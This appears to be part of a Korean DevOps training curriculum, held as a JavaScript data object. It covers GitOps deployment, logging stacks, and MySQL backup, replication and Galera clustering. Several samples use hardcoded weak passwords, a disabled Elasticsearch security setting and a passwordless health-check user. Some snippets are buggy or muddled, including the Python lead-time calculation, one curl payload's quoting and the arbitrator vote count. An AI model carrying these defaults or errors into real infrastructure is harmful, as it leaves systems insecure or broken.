kubectl port-forward svc/argocd-server -n argocd 8080:443`},{heading:"2. Kustomize로 환경별 설정 관리",code:`# 기본 설정
# base/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 2
  template:
    spec:
      containers:
      - name: myapp
        image: myapp:latest
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"

# Staging 환경 오버레이
# overlays/staging/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
bases:
- ../../base
namePrefix: staging-
replicas:
- name: myapp
  count: 1
images:
- name: myapp
  newTag: staging-latest

# Production 환경 오버레이
# overlays/production/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
bases:
- ../../base
namePrefix: prod-
replicas:
- name: myapp
  count: 5
images:
- name: myapp
  newTag: v1.2.3
patchesStrategicMerge:
- resources.yaml

# overlays/production/resources.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      containers:
      - name: myapp
        resources:
          requests:
            memory: "512Mi"
            cpu: "500m"
          limits:
            memory: "1Gi"
            cpu: "1000m"

# 적용:
kubectl apply -k overlays/staging
kubectl apply -k overlays/production`},{heading:"3. Flagger로 자동 Canary 배포",code:`# Flagger 설치
kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/crd.yaml
kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/deployment.yaml

# Canary 정의
# canary.yaml
apiVersion: flagger.app/v1beta1
kind: Canary
metadata:
  name: myapp
  namespace: production
spec:
  targetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  service:
    port: 80
  analysis:
    interval: 1m
    threshold: 5
    maxWeight: 50
    stepWeight: 10
    metrics:
    - name: request-success-rate
      thresholdRange:
        min: 99
      interval: 1m
    - name: request-duration
      thresholdRange:
        max: 500
      interval: 1m
    webhooks:
    - name: load-test
      url: http://flagger-loadtester/
      timeout: 5s
      metadata:
        cmd: "hey -z 1m -q 10 -c 2 http://myapp-canary/"

# 동작:
# 1. 새 버전 배포 감지
# 2. Canary 파드 생성 (10% 트래픽)
# 3. 1분간 메트릭 측정
# 4. 성공률 99% 이상 & 응답 시간 500ms 이하면 → 20% 증가
# 5. 실패하면 → 롤백
# 6. 50%까지 증가 후 전체 전환`},{heading:"4. 멀티 클러스터 배포",code:`# Flux로 여러 클러스터 관리
# clusters/staging/flux-system/gotk-sync.yaml
apiVersion: source.toolkit.fluxcd.io/v1beta2
kind: GitRepository
metadata:
  name: flux-system
  namespace: flux-system
spec:
  interval: 1m
  url: https://github.com/myuser/fleet-infra
  ref:
    branch: main

# clusters/staging/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/staging
  sourceRef:
    kind: GitRepository
    name: flux-system

# clusters/production-us/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/production-us
  sourceRef:
    kind: GitRepository
    name: flux-system

# clusters/production-eu/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/production-eu
  sourceRef:
    kind: GitRepository
    name: flux-system

# 배포 프로세스:
# 1. Git에 앱 매니페스트 업데이트
# 2. Flux가 모든 클러스터에서 감지
# 3. Staging → Production-US → Production-EU 순차 배포
# 4. 각 클러스터별로 Canary 배포 자동 실행`},{heading:"5. 배포 승인 워크플로우",code:`# GitHub Actions with manual approval
name: Production Deployment

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build image
        run: docker build -t myapp:\${{ github.sha }} .
      - name: Push image
        run: docker push myapp:\${{ github.sha }}

  request-approval:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Create pull request
        uses: peter-evans/create-pull-request@v5
        with:
          title: "Deploy \${{ github.sha }} to production"
          body: |
            ## Deployment Request
            - Commit: \${{ github.sha }}
            - Author: \${{ github.actor }}
            - Tests: Passed ✅

            Please review and approve to deploy to production.
          branch: deploy/\${{ github.sha }}
          base: main

  deploy-production:
    needs: request-approval
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com
    steps:
      - name: Update k8s manifest
        run: |
          git clone https://github.com/myuser/myapp-k8s
          cd myapp-k8s
          sed -i 's|image: myapp:.*|image: myapp:\${{ github.sha }}|' k8s/deployment.yaml
          git commit -am "Deploy \${{ github.sha }}"
          git push

      - name: Wait for ArgoCD sync
        run: |
          argocd app wait myapp --timeout 600

      - name: Smoke test
        run: |
          curl -f https://myapp.com/health || exit 1`},{heading:"6. 배포 메트릭과 SLO 추적",code:`# Prometheus로 배포 메트릭 수집
# deployment-exporter.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-exporter
spec:
  template:
    spec:
      containers:
      - name: exporter
        image: deployment-exporter:latest
        env:
        - name: GITHUB_TOKEN
          valueFrom:
            secretKeyRef:
              name: github-token
              key: token

# Python 스크립트 (deployment-exporter)
import requests
from prometheus_client import start_http_server, Gauge
import time

DEPLOYMENT_FREQUENCY = Gauge('deployment_frequency', 'Deployments per day')
LEAD_TIME = Gauge('deployment_lead_time_seconds', 'Time from commit to deploy')
MTTR = Gauge('deployment_mttr_seconds', 'Mean time to recovery')
CHANGE_FAILURE_RATE = Gauge('deployment_change_failure_rate', 'Failed deployments %')

def collect_metrics():
    # GitHub API로 배포 정보 수집
    response = requests.get(
        'https://api.github.com/repos/myuser/myapp/actions/runs',
        headers={'Authorization': f'token {GITHUB_TOKEN}'}
    )

    runs = response.json()['workflow_runs']

    # 배포 빈도 계산
    deployments_today = len([r for r in runs if is_today(r['created_at'])])
    DEPLOYMENT_FREQUENCY.set(deployments_today)

    # Lead Time 계산
    for run in runs:
        if run['conclusion'] == 'success':
            lead_time = (run['updated_at'] - run['created_at']).total_seconds()
            LEAD_TIME.set(lead_time)
            break

if __name__ == '__main__':
    start_http_server(8000)
    while True:
        collect_metrics()
        time.sleep(60)

# Grafana 대시보드
# 1. Deployment Frequency: 하루 평균 배포 횟수
# 2. Lead Time: 커밋부터 배포까지 평균 시간
# 3. MTTR: 장애 복구 평균 시간
# 4. Change Failure Rate: 배포 실패율`},{heading:"⚡ 고급 실습 과제",checklist:["ArgoCD로 GitOps 구현 후 Git push만으로 배포 자동화","Kustomize로 Staging/Production 환경 분리하여 각각 다른 설정 적용","Flagger로 Canary 배포 자동화 (성공률 99% 이상일 때만 진행)","3개 클러스터 (Staging, US, EU)에 순차 배포 구현","배포 메트릭 (빈도, Lead Time, MTTR) Prometheus + Grafana로 추적"]}]}}},{id:"4-2",name:"로그 관리와 분석",goal:"로그를 체계적으로 관리하고 인사이트를 얻을 수 있다",hours:12,keywords:["log management","centralized logging","log analysis"],tasks:["중앙 집중식 로그 시스템 구축","로그 검색 및 분석","알림 규칙 설정"],content:{beginner:{title:"초급: 구조화된 로깅과 기본 분석",sections:[{heading:"📚 학습 목표",content:"구조화된 로그를 작성하고, 로그 레벨을 적절히 사용할 수 있다."},{heading:"1. 좋은 로그 vs 나쁜 로그",code:`// 나쁜 로그
console.log("Error");
console.log("User logged in");
console.log("Data:", data);

// 좋은 로그 (Winston 사용)
const winston = require('winston');

const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'app.log' })
  ]
});

logger.error('Database connection failed', {
  error: err.message,
  userId: req.user.id,
  timestamp: new Date().toISOString()
});

logger.info('User login successful', {
  userId: user.id,
  ip: req.ip,
  userAgent: req.headers['user-agent']
});`},{heading:"2. 로그 레벨 활용",code:`// ERROR: 즉시 조치 필요
logger.error('Payment processing failed', {
  orderId: 12345,
  amount: 100,
  error: 'Gateway timeout'
});

// WARN: 주의 필요
logger.warn('API rate limit approaching', {
  remaining: 10,
  limit: 100
});

// INFO: 중요 이벤트
logger.info('Order completed', {
  orderId: 12345,
  userId: 789
});

// DEBUG: 개발 디버깅용
logger.debug('Query executed', {
  sql: 'SELECT * FROM users WHERE id = ?',
  params: [123],
  duration: '15ms'
});`},{heading:"💡 초급 실습 과제",checklist:["Winston으로 구조화된 로그 시스템 구축","로그 레벨별로 다른 파일에 저장 (error.log, combined.log)","요청/응답 미들웨어로 모든 API 호출 로깅"]}]},intermediate:{title:"중급: 중앙 집중식 로그 시스템 (ELK Stack)",sections:[{heading:"📚 학습 목표",content:"Elasticsearch + Kibana로 로그를 중앙에서 관리하고 검색할 수 있다."},{heading:"1. Docker Compose로 ELK Stack 구성",code:`# docker-compose.yml
version: '3.8'
services:
  elasticsearch:
    image: elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"

  kibana:
    image: kibana:8.11.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200

  logstash:
    image: logstash:8.11.0
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    ports:
      - "5000:5000"

# logstash.conf
input {
  tcp {
    port => 5000
    codec => json
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "app-logs-%{+YYYY.MM.dd}"
  }
}`},{heading:"2. 애플리케이션에서 Logstash로 전송",code:`const winston = require('winston');
require('winston-logstash');

const logger = winston.createLogger({
  transports: [
    new winston.transports.Logstash({
      port: 5000,
      host: 'localhost',
      node_name: 'my-app'
    })
  ]
});

logger.info('User action', {
  userId: 123,
  action: 'purchase',
  amount: 100
});`},{heading:"⚡ 중급 실습 과제",checklist:["ELK Stack Docker Compose로 구축","애플리케이션 로그를 Logstash로 전송","Kibana에서 실시간 로그 검색 및 대시보드 생성"]}]},advanced:{title:"고급: 분산 추적과 로그 상관관계",sections:[{heading:"📚 학습 목표",content:"OpenTelemetry로 분산 추적을 구현하고, 로그와 트레이스를 연결할 수 있다."},{heading:"1. OpenTelemetry 통합",code:`const { NodeSDK } = require('@opentelemetry/sdk-node');
const { getNodeAutoInstrumentations } = require('@opentelemetry/auto-instrumentations-node');
const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');

const sdk = new NodeSDK({
  traceExporter: new JaegerExporter({
    endpoint: 'http://localhost:14268/api/traces',
  }),
  instrumentations: [getNodeAutoInstrumentations()],
});

sdk.start();

// 로그와 Trace ID 연결
const trace = require('@opentelemetry/api').trace;

app.use((req, res, next) => {
  const span = trace.getActiveSpan();
  const traceId = span?.spanContext().traceId;

  req.logger = logger.child({ traceId });
  next();
});`},{heading:"⚡ 고급 실습 과제",checklist:["OpenTelemetry + Jaeger로 분산 추적 구현","로그에 Trace ID 포함하여 요청 전체 추적","Grafana Loki로 로그 집계 및 알림 설정"]}]}}},{id:"4-3",name:"데이터베이스 고급 운영",goal:"데이터베이스를 전문적으로 관리할 수 있다",hours:20,keywords:["database replication","sharding","high availability"],tasks:["Master-Slave 복제 구성","데이터베이스 백업 자동화","고가용성 클러스터 구축"],content:{beginner:{title:"초급: 데이터베이스 백업과 복구 전략",sections:[{heading:"📚 학습 목표",content:"정기적인 백업을 자동화하고, 다양한 복구 시나리오를 처리할 수 있다."},{heading:"1. 백업 전략의 중요성",content:"데이터 손실은 서비스 종료로 이어질 수 있습니다.",list:["하드웨어 고장: SSD/HDD 장애로 데이터 소실","인적 오류: DROP TABLE 실수로 테이블 삭제","보안 사고: 랜섬웨어 공격으로 DB 암호화","자연재해: 데이터센터 화재/침수"]},{heading:"2. 3-2-1 백업 규칙",code:`# 3-2-1 백업 전략
3: 데이터의 복사본 3개 유지
2: 서로 다른 2가지 매체에 저장 (HDD + SSD, 로컬 + 클라우드)
1: 1개는 오프사이트(원격지)에 보관

# 예시:
- 원본: 운영 서버 MySQL (로컬 SSD)
- 백업 1: 같은 서버 다른 디스크 (로컬 HDD)
- 백업 2: AWS S3 (클라우드)
- 백업 3: 다른 리전 S3 (재해 복구용)`},{heading:"3. mysqldump로 전체 백업",code:`#!/bin/bash
# full-backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/var/backups/mysql"
DB_NAME="mydb"
RETENTION_DAYS=7

# 백업 디렉토리 생성
mkdir -p $BACKUP_DIR

# MySQL 전체 백업 (압축)
mysqldump -u root -p\${MYSQL_PASSWORD} \\
  --single-transaction \\
  --quick \\
  --lock-tables=false \\
  \${DB_NAME} | gzip > \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz

# 백업 파일 권한 설정
chmod 600 \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz

# 백업 성공 확인
if [ $? -eq 0 ]; then
  echo "[$(date)] Backup successful: \${DB_NAME}_\${DATE}.sql.gz" >> /var/log/mysql-backup.log
else
  echo "[$(date)] Backup failed!" >> /var/log/mysql-backup.log
  # Slack 알림
  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ DB Backup Failed!"}'
  exit 1
fi

# 오래된 백업 삭제 (7일 이상)
find \${BACKUP_DIR} -name "*.sql.gz" -mtime +\${RETENTION_DAYS} -delete

# S3 업로드
aws s3 cp \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz \\
  s3://my-backup-bucket/mysql/\${DATE}/ \\
  --storage-class STANDARD_IA

echo "[$(date)] Backup uploaded to S3" >> /var/log/mysql-backup.log`},{heading:"4. Cron으로 자동화",code:`# Crontab 편집
crontab -e

# 매일 새벽 3시 전체 백업
0 3 * * * /var/scripts/full-backup.sh

# 매주 일요일 새벽 4시 다른 리전으로 복사
0 4 * * 0 aws s3 sync s3://my-backup-bucket/ s3://my-backup-dr-bucket/ --region us-west-2

# 매 6시간마다 Binary Log 백업
0 */6 * * * mysqlbinlog /var/log/mysql/mysql-bin.* | gzip > /var/backups/binlog_$(date +%Y%m%d_%H).gz

# Cron 로그 확인
tail -f /var/log/cron
tail -f /var/log/mysql-backup.log`},{heading:"5. 백업 복원 절차",steps:[{label:"전체 복원",code:`# 1. 백업 파일 다운로드
aws s3 cp s3://my-backup-bucket/mysql/20240101_030000/mydb_20240101_030000.sql.gz .

# 2. 압축 해제 및 복원
gunzip mydb_20240101_030000.sql.gz
mysql -u root -p mydb < mydb_20240101_030000.sql

# 3. 확인
mysql -u root -p -e "SELECT COUNT(*) FROM mydb.users;"`},{label:"특정 테이블만 복원",code:`# 백업 파일에서 특정 테이블만 추출
zcat mydb_20240101_030000.sql.gz | sed -n '/DROP TABLE.*\`users\`/,/UNLOCK TABLES/p' > users_only.sql

# 복원
mysql -u root -p mydb < users_only.sql`},{label:"Point-in-Time Recovery (특정 시점 복구)",code:`# 시나리오: 오후 2시에 실수로 테이블 삭제, 새벽 3시 백업 있음

# 1. 새벽 3시 백업 복원
mysql -u root -p mydb < mydb_20240101_030000.sql

# 2. Binary Log로 3시~2시까지 재실행
mysqlbinlog --start-datetime="2024-01-01 03:00:00" \\
            --stop-datetime="2024-01-01 14:00:00" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p mydb

# 결과: 14시 직전 상태로 복구 완료!`}]},{heading:"6. 백업 테스트 자동화",code:`#!/bin/bash
# test-backup.sh

LATEST_BACKUP=$(ls -t /var/backups/mysql/*.sql.gz | head -1)

# 테스트 DB에 복원
gunzip -c \${LATEST_BACKUP} | mysql -u root -p test_restore_db

# 테이블 개수 확인
TABLE_COUNT=$(mysql -u root -p -se "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test_restore_db'")

if [ \${TABLE_COUNT} -gt 0 ]; then
  echo "[$(date)] Backup test successful: \${TABLE_COUNT} tables restored"
else
  echo "[$(date)] Backup test FAILED!"
  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ Backup Restore Test Failed!"}'
fi

# 테스트 DB 삭제
mysql -u root -p -e "DROP DATABASE test_restore_db"

# 매주 토요일 자동 테스트
# 0 5 * * 6 /var/scripts/test-backup.sh`},{heading:"💡 초급 실습 과제",checklist:["매일 자동 백업 스크립트 작성 및 Cron 등록","백업 파일을 S3에 자동 업로드 설정","7일 이상 된 백업 파일 자동 삭제 확인","전체 백업 파일로 복원 테스트 성공","특정 테이블만 복원하는 스크립트 작성"]}]},intermediate:{title:"중급: Master-Slave 복제와 읽기 분산",sections:[{heading:"📚 학습 목표",content:"Master-Slave 복제를 구성하여 고가용성과 읽기 성능을 향상시킬 수 있다."},{heading:"1. 복제(Replication)의 이점",list:["고가용성: Master 장애 시 Slave를 Master로 승격","읽기 분산: Slave에서 SELECT 쿼리 처리 (성능 2~3배 향상)","백업 부하 감소: Slave에서 백업 수행 (Master 영향 없음)","지리적 분산: 지역별 Slave 배치로 지연 시간 감소"]},{heading:"2. MySQL Master-Slave 설정",steps:[{label:"Master 서버 설정",code:`# /etc/mysql/my.cnf (Master)
[mysqld]
server-id = 1                    # 고유 ID
log_bin = /var/log/mysql/mysql-bin.log
binlog_do_db = mydb              # 복제할 DB
binlog_format = ROW              # ROW 방식 (안전)
expire_logs_days = 7             # Binary Log 7일 보관
max_binlog_size = 100M

# MySQL 재시작
sudo systemctl restart mysql

# 복제 사용자 생성
mysql -u root -p
CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
FLUSH PRIVILEGES;

# Master 상태 확인 (binlog 파일명과 위치 기록!)
SHOW MASTER STATUS;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |      154 | mydb         |                  |
+------------------+----------+--------------+------------------+`},{label:"Slave 서버 설정",code:`# /etc/mysql/my.cnf (Slave)
[mysqld]
server-id = 2                    # Master와 다른 ID
relay-log = /var/log/mysql/mysql-relay-bin
log_bin = /var/log/mysql/mysql-bin.log
read_only = 1                    # 읽기 전용 (안전)

# MySQL 재시작
sudo systemctl restart mysql

# Master 데이터 복사 (mysqldump)
mysqldump -u root -p --master-data=2 --single-transaction mydb > master_dump.sql

# Slave에 복원
mysql -u root -p mydb < master_dump.sql

# Slave 설정
mysql -u root -p
CHANGE MASTER TO
  MASTER_HOST='192.168.1.100',           # Master IP
  MASTER_USER='repl',
  MASTER_PASSWORD='repl_password',
  MASTER_LOG_FILE='mysql-bin.000001',    # SHOW MASTER STATUS에서 확인
  MASTER_LOG_POS=154;                    # SHOW MASTER STATUS에서 확인

START SLAVE;

# Slave 상태 확인
SHOW SLAVE STATUS\\G

# 중요 필드:
# Slave_IO_Running: Yes
# Slave_SQL_Running: Yes
# Seconds_Behind_Master: 0       # 복제 지연 시간
# Last_Error: (비어있어야 함)`}]},{heading:"3. 애플리케이션에서 읽기/쓰기 분산",code:`// Node.js에서 Master/Slave 분리
const mysql = require('mysql2/promise');

// Master Pool (쓰기 전용)
const masterPool = mysql.createPool({
  host: '192.168.1.100',
  user: 'root',
  password: 'password',
  database: 'mydb',
  connectionLimit: 10
});

// Slave Pool (읽기 전용)
const slavePool = mysql.createPool({
  host: '192.168.1.101',
  user: 'root',
  password: 'password',
  database: 'mydb',
  connectionLimit: 50  // 읽기가 많으므로 더 많은 연결
});

// 읽기 쿼리 → Slave
app.get('/api/users', async (req, res) => {
  const [users] = await slavePool.query('SELECT * FROM users');
  res.json(users);
});

// 쓰기 쿼리 → Master
app.post('/api/users', async (req, res) => {
  await masterPool.query('INSERT INTO users (name, email) VALUES (?, ?)', [
    req.body.name,
    req.body.email
  ]);
  res.json({ success: true });
});

// 여러 Slave가 있을 때 로드 밸런싱
const slaves = [
  mysql.createPool({ host: '192.168.1.101', ... }),
  mysql.createPool({ host: '192.168.1.102', ... }),
  mysql.createPool({ host: '192.168.1.103', ... })
];

function getSlavePool() {
  const index = Math.floor(Math.random() * slaves.length);
  return slaves[index];
}

app.get('/api/products', async (req, res) => {
  const pool = getSlavePool();
  const [products] = await pool.query('SELECT * FROM products');
  res.json(products);
});`},{heading:"4. ProxySQL로 자동 읽기/쓰기 분리",code:`# ProxySQL 설치
docker run -d --name proxysql \\
  -p 6033:6033 \\
  -p 6032:6032 \\
  proxysql/proxysql

# ProxySQL 관리 콘솔 접속
mysql -u admin -padmin -h 127.0.0.1 -P6032

# Master 추가
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (1, '192.168.1.100', 3306);

# Slave 추가
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.101', 3306);
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.102', 3306);

# 쿼리 라우팅 규칙
INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
VALUES (1, '^SELECT.*FOR UPDATE', 1, 1);  # SELECT FOR UPDATE → Master

INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
VALUES (1, '^SELECT', 2, 1);  # SELECT → Slave

# 설정 적용
LOAD MYSQL SERVERS TO RUNTIME;
LOAD MYSQL QUERY RULES TO RUNTIME;
SAVE MYSQL SERVERS TO DISK;
SAVE MYSQL QUERY RULES TO DISK;

# 애플리케이션은 ProxySQL만 바라봄
const pool = mysql.createPool({
  host: '127.0.0.1',
  port: 6033,  # ProxySQL 포트
  user: 'root',
  password: 'password',
  database: 'mydb'
});

// 자동으로 SELECT는 Slave, INSERT/UPDATE는 Master로!
const [users] = await pool.query('SELECT * FROM users');  # → Slave
await pool.query('INSERT INTO users VALUES (...)');       # → Master`},{heading:"5. 복제 지연 모니터링",code:`# Prometheus Exporter for MySQL
docker run -d --name mysql-exporter \\
  -p 9104:9104 \\
  -e DATA_SOURCE_NAME="exporter:password@(slave-host:3306)/" \\
  prom/mysqld-exporter

# Prometheus 스크랩 설정 (prometheus.yml)
scrape_configs:
  - job_name: 'mysql-slave'
    static_configs:
      - targets: ['localhost:9104']

# Grafana 알림 규칙
groups:
  - name: mysql-replication
    interval: 30s
    rules:
      - alert: ReplicationLag
        expr: mysql_slave_status_seconds_behind_master > 60
        for: 5m
        annotations:
          summary: "Replication lag is {{ $value }}s"

# 수동 확인 스크립트
#!/bin/bash
LAG=$(mysql -u root -p -e "SHOW SLAVE STATUS\\G" | grep Seconds_Behind_Master | awk '{print $2}')

if [ \${LAG} -gt 60 ]; then
  echo "WARNING: Replication lag is \${LAG} seconds"
  curl -X POST \${SLACK_WEBHOOK} -d "{"text":"⚠️ Replication lag: \${LAG}s"}"
fi`},{heading:"6. Slave 장애 시 자동 제외",code:`# ProxySQL에서 헬스 체크 설정
UPDATE mysql_servers SET max_replication_lag = 10 WHERE hostgroup_id = 2;

# 복제 지연 10초 이상이면 자동으로 라우팅에서 제외
# 복구되면 자동으로 다시 포함

# Keepalived로 Slave VIP 관리
# /etc/keepalived/keepalived.conf
vrrp_script check_mysql {
    script "/usr/local/bin/check_mysql.sh"
    interval 2
}

vrrp_instance VI_1 {
    state MASTER
    interface eth0
    virtual_router_id 51
    priority 100
    virtual_ipaddress {
        192.168.1.200  # Slave VIP
    }
    track_script {
        check_mysql
    }
}

# check_mysql.sh
#!/bin/bash
mysql -u root -p -e "SELECT 1" > /dev/null 2>&1
if [ $? -eq 0 ]; then
  exit 0  # MySQL 정상
else
  exit 1  # MySQL 장애 → VIP를 다른 Slave로 이동
fi`},{heading:"⚡ 중급 실습 과제",checklist:["Master 1대 + Slave 2대 복제 구성 완료","ProxySQL로 자동 읽기/쓰기 분리 설정","복제 지연 60초 이상 시 Slack 알림 설정","Slave 장애 시 자동으로 라우팅에서 제외되는지 확인","읽기 쿼리 부하 테스트 후 Slave로 분산되는지 확인"]}]},advanced:{title:"고급: Multi-Master 클러스터와 자동 페일오버",sections:[{heading:"📚 학습 목표",content:"Galera Cluster로 고가용성 DB 클러스터를 구축하고, 자동 페일오버를 구현할 수 있다."},{heading:"1. Galera Cluster 개념",content:"모든 노드가 Master인 Multi-Master 동기식 복제 클러스터입니다.",list:["동기식 복제: 쓰기가 모든 노드에 동시 적용 (데이터 일관성 보장)","자동 페일오버: 노드 장애 시 자동으로 클러스터에서 제외","읽기/쓰기 모두 분산: 모든 노드에서 INSERT/UPDATE 가능","제로 다운타임: 노드 추가/제거 시에도 서비스 중단 없음"]},{heading:"2. Galera Cluster 구성 (MariaDB)",code:`# docker-compose.yml
version: '3.8'
services:
  galera-node1:
    image: mariadb:latest
    hostname: galera-node1
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: mydb
    volumes:
      - ./node1-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-new-cluster
      --wsrep-node-name=node1
      --wsrep-node-address=galera-node1

  galera-node2:
    image: mariadb:latest
    hostname: galera-node2
    environment:
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - ./node2-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-node-name=node2
      --wsrep-node-address=galera-node2
      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3

  galera-node3:
    image: mariadb:latest
    hostname: galera-node3
    environment:
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - ./node3-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-node-name=node3
      --wsrep-node-address=galera-node3
      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3

# galera.cnf
[mysqld]
binlog_format=ROW
default-storage-engine=innodb
innodb_autoinc_lock_mode=2
bind-address=0.0.0.0

# Galera 설정
wsrep_on=ON
wsrep_provider=/usr/lib/galera/libgalera_smm.so
wsrep_cluster_name="my-galera-cluster"
wsrep_sst_method=rsync

# 실행
docker-compose up -d

# 클러스터 상태 확인
mysql -u root -p -e "SHOW STATUS LIKE 'wsrep_cluster_size'"
# wsrep_cluster_size | 3  ← 3개 노드 정상`},{heading:"3. HAProxy로 로드 밸런싱 + 헬스 체크",code:`# haproxy.cfg
global
    log stdout format raw local0

defaults
    log     global
    mode    tcp
    option  tcplog
    timeout connect 10s
    timeout client 30s
    timeout server 30s

# MySQL 읽기/쓰기 분산
listen mysql-cluster
    bind *:3306
    mode tcp
    option mysql-check user haproxy_check
    balance roundrobin
    server galera-node1 galera-node1:3306 check
    server galera-node2 galera-node2:3306 check
    server galera-node3 galera-node3:3306 check

# HAProxy 통계 페이지
listen stats
    bind *:8404
    stats enable
    stats uri /
    stats refresh 10s

# docker-compose.yml에 추가
  haproxy:
    image: haproxy:latest
    volumes:
      - ./haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg
    ports:
      - "3306:3306"
      - "8404:8404"
    depends_on:
      - galera-node1
      - galera-node2
      - galera-node3

# 헬스 체크 사용자 생성 (각 노드에서)
CREATE USER 'haproxy_check'@'%';
FLUSH PRIVILEGES;

# 애플리케이션은 HAProxy만 바라봄
const pool = mysql.createPool({
  host: 'haproxy',  # HAProxy
  port: 3306,
  user: 'root',
  password: 'root',
  database: 'mydb'
});

// 어느 노드에 연결되든 상관없이 쓰기/읽기 모두 가능
await pool.query('INSERT INTO users ...');  # 모든 노드에 동기 복제
const [users] = await pool.query('SELECT * FROM users');  # 어느 노드에서든 읽기`},{heading:"4. 자동 Split-Brain 방지",code:`# Split-Brain: 네트워크 단절로 클러스터가 2개로 분리되는 현상

# 방지 방법 1: 쿼럼 (Quorum) 설정
# 과반수 노드가 살아있어야만 쓰기 허용
# 3노드 → 최소 2노드, 5노드 → 최소 3노드

# galera.cnf에 추가
wsrep_provider_options="pc.ignore_quorum=false;pc.ignore_sb=false"

# 테스트: 2개 노드 다운 시
docker-compose stop galera-node2 galera-node3

# node1에서 쓰기 시도
mysql -u root -p -e "INSERT INTO users VALUES (1, 'test')"
# ERROR: WSREP has not yet prepared node for application use
# → 쿼럼 부족으로 자동 읽기 전용 전환!

# 방지 방법 2: Arbitrator (중재자) 추가
# 데이터 없이 투표만 참여하는 경량 노드
docker run -d --name garbd \\
  --network mynet \\
  severalnines/garbd \\
  --address gcomm://galera-node1,galera-node2,galera-node3 \\
  --group my-galera-cluster

# 효과: 홀수 투표권 확보 (3노드 + 1 arbitrator = 4표)
# 2노드 다운 → 1노드 + arbitrator = 2표 (과반수 미달, 쓰기 차단)`},{heading:"5. Point-in-Time Recovery (PITR) 구현",code:`# 1. 증분 백업 설정
# XtraBackup으로 증분 백업
docker run --rm --volumes-from galera-node1 \\
  perconalab/percona-xtrabackup \\
  xtrabackup --backup --target-dir=/backup/full

# 6시간마다 증분 백업
docker run --rm --volumes-from galera-node1 \\
  perconalab/percona-xtrabackup \\
  xtrabackup --backup --incremental-basedir=/backup/full \\
  --target-dir=/backup/inc1

# 2. Binary Log 보관
# galera.cnf에 추가
log_bin = /var/log/mysql/mysql-bin.log
expire_logs_days = 7
sync_binlog = 1

# 3. PITR 복구 절차
# 시나리오: 2024-01-15 14:30에 실수로 테이블 삭제

# Step 1: 가장 최근 전체 백업 복원 (14:00 백업)
xtrabackup --prepare --target-dir=/backup/full
xtrabackup --copy-back --target-dir=/backup/full

# Step 2: Binary Log로 14:00 ~ 14:29:59까지 재실행
mysqlbinlog --start-datetime="2024-01-15 14:00:00" \\
            --stop-datetime="2024-01-15 14:29:59" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p

# 결과: 14:30 직전 상태로 복구!

# 자동화 스크립트
#!/bin/bash
# pitr-restore.sh

RESTORE_TIME="$1"  # 예: "2024-01-15 14:29:59"
BACKUP_DIR="/backup"

# 1. 복원 시점 이전의 가장 최근 백업 찾기
